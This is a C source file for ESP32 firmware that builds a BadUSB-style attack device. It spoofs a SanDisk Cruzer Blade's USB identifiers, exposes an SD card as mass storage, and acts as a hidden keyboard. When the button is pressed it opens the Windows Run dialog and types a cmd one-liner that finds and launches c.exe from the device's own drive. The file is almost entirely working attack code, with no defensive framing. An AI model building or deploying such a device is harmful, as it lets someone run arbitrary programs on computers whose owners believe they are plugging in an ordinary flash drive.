#include <stdio.h>
#include <string.h>
#include <sys/unistd.h>
#include <sys/stat.h>
#include "esp_log.h"
#include "esp_vfs_fat.h"
#include "driver/sdmmc_host.h"
#include "driver/sdmmc_defs.h"
#include "sdmmc_cmd.h"
#include "tinyusb.h"
#include "tusb_msc_storage.h"
#include "class/hid/hid_device.h"
#include "class/msc/msc.h"
#include "ff.h"

// Hardware configuration
#define APP_BUTTON GPIO_NUM_0      // BOOT button
#define KEY_DELAY_MS 15
#define BASE_PATH "/sd"            // Mount point for SD card
static const char *TAG = "Composite Example";
#define ESP_VOLUME_LABEL "USB_SAM_DISC"

// USB endpoint numbers and descriptor lengths
#define EPNUM_HID   1
#define EPNUM_MSC   2
#define TUSB_DESC_TOTAL_LEN (TUD_CONFIG_DESC_LEN + TUD_HID_DESC_LEN + TUD_MSC_DESC_LEN)

enum {
    ITF_NUM_HID = 0,
    ITF_NUM_MSC,
    ITF_NUM_TOTAL
};

// USB device descriptor
static tusb_desc_device_t descriptor_config = {
    .bLength = sizeof(tusb_desc_device_t),
    .bDescriptorType = TUSB_DESC_DEVICE,
    .bcdUSB = 0x0200, // USB 2.0
    .bDeviceClass = TUSB_CLASS_MISC,
    .bDeviceSubClass = MISC_SUBCLASS_COMMON,
    .bDeviceProtocol = MISC_PROTOCOL_IAD,
    .bMaxPacketSize0 = CFG_TUD_ENDPOINT0_SIZE,
    .idVendor = 0x0781, // SanDisk VID
    .idProduct = 0x5567, // Cruzer Blade PID
    .bcdDevice = 0x0100, // Device version 1.00
    .iManufacturer = 0x01,
    .iProduct = 0x02,
    .iSerialNumber = 0x03,
    .bNumConfigurations = 0x01
};

// HID report descriptor (keyboard)
const uint8_t hid_report_descriptor[] = {
    TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(HID_ITF_PROTOCOL_KEYBOARD))
};

// USB composite configuration descriptor
static uint8_t const composite_configuration_desc[] = {
    // Config number, interface count, string index, total length, attributes, power in mA
    TUD_CONFIG_DESCRIPTOR(1, ITF_NUM_TOTAL, 0, TUSB_DESC_TOTAL_LEN, TUSB_DESC_CONFIG_ATT_REMOTE_WAKEUP, 100),

    // HID interface (keyboard)
    TUD_HID_DESCRIPTOR(ITF_NUM_HID, 0, false, sizeof(hid_report_descriptor), EPNUM_HID | 0x80, 16, 10),

    // MSC interface (mass storage)
    TUD_MSC_DESCRIPTOR(ITF_NUM_MSC, 0, EPNUM_MSC, EPNUM_MSC | 0x80, 64),
};

// USB string descriptors
static char const *string_desc_arr[] = {
    (const char[]){0x09, 0x04}, // Language: English (US)
    "SanDisk",                  // Manufacturer
    "Cruzer Blade",            // Product
    "1234567890AB",            // Serial number
    "HID Interface",           // HID interface string
    "MSC Interface",           // MSC interface string
};

// HID callbacks
uint8_t const *tud_hid_descriptor_report_cb(uint8_t instance) {
    return hid_report_descriptor;
}

void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t const *buffer, uint16_t bufsize) {}

uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t *buffer, uint16_t reqlen) {
    return 0;
}

// Keyboard functions
static void send_key(uint8_t modifier, uint8_t keycode) {
    uint8_t keys[6] = { keycode };
    tud_hid_keyboard_report(HID_ITF_PROTOCOL_KEYBOARD, modifier, keys);
    vTaskDelay(pdMS_TO_TICKS(KEY_DELAY_MS));
    tud_hid_keyboard_report(HID_ITF_PROTOCOL_KEYBOARD, 0, NULL);
    vTaskDelay(pdMS_TO_TICKS(KEY_DELAY_MS));
}

// Initialize SD card
static sdmmc_card_t *sd_card_init(void) {
    sdmmc_host_t host = SDMMC_HOST_DEFAULT();
    sdmmc_slot_config_t slot_config = SDMMC_SLOT_CONFIG_DEFAULT();

    // Configure pins (adjust to your hardware)
    slot_config.width = 1;

    slot_config.clk = GPIO_NUM_36;
    slot_config.cmd = GPIO_NUM_35;
    slot_config.d0 = GPIO_NUM_37;

    esp_vfs_fat_sdmmc_mount_config_t mount_config = {
        .format_if_mount_failed = false,
        .max_files = 5,
        .allocation_unit_size = 16 * 1024
    };

    sdmmc_card_t *card;
    ESP_ERROR_CHECK(esp_vfs_fat_sdmmc_mount(BASE_PATH, &host, &slot_config, &mount_config, &card));

    return card;
}

// Send text string as keystrokes
static void send_text(const char *text) {
    uint8_t const conv_table[128][2] = { HID_ASCII_TO_KEYCODE };
    while (*text) {
        uint8_t keycode = 0;
        uint8_t modifier = 0;
        if (conv_table[(uint8_t)(*text)][0]) modifier = KEYBOARD_MODIFIER_LEFTSHIFT;
        keycode = conv_table[(uint8_t)(*text)][1];

        if (keycode) {
            send_key(modifier, keycode);
        }
        text++;
    }
}

void app_main(void) {
    // Initialize SD card
    sdmmc_card_t *sd_card = sd_card_init();
    ESP_LOGI(TAG, "SD Card initialized");

    // Configure MSC
    const tinyusb_msc_sdmmc_config_t msc_config = {
        .card = sd_card
    };
    ESP_ERROR_CHECK(tinyusb_msc_storage_init_sdmmc(&msc_config));

    // Initialize USB composite device
    const tinyusb_config_t tusb_cfg = {
        .device_descriptor = &descriptor_config,
        .string_descriptor = string_desc_arr,
        .string_descriptor_count = sizeof(string_desc_arr)/sizeof(string_desc_arr[0]),
        .external_phy = false,
        .configuration_descriptor = composite_configuration_desc,
    };
    ESP_ERROR_CHECK(tinyusb_driver_install(&tusb_cfg));
    ESP_LOGI(TAG, "USB Composite Initialized");

    // Configure button
    gpio_config_t btn_config = {
        .pin_bit_mask = BIT64(APP_BUTTON),
        .mode = GPIO_MODE_INPUT,
        .pull_up_en = GPIO_PULLUP_ENABLE,
    };
    gpio_config(&btn_config);

    // Command to run from USB storage (example for Windows)
    const char *command = "cmd /c for %d in (D E F G H I J K) do if exist %d:\\c (start \"\" %d:\\c\\c.exe %d:\\c\\_internal & goto :eof)\n";

    // Main loop
    while (1) {
        if (gpio_get_level(APP_BUTTON) == 0) {
            ESP_LOGI(TAG, "Button pressed - sending keys");
            // Send Win + R
            send_key(KEYBOARD_MODIFIER_LEFTGUI, HID_KEY_R);
            vTaskDelay(pdMS_TO_TICKS(150)); // Wait for Run dialog
            send_text(command);             // Send command string
            vTaskDelay(pdMS_TO_TICKS(200)); // Debounce
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}
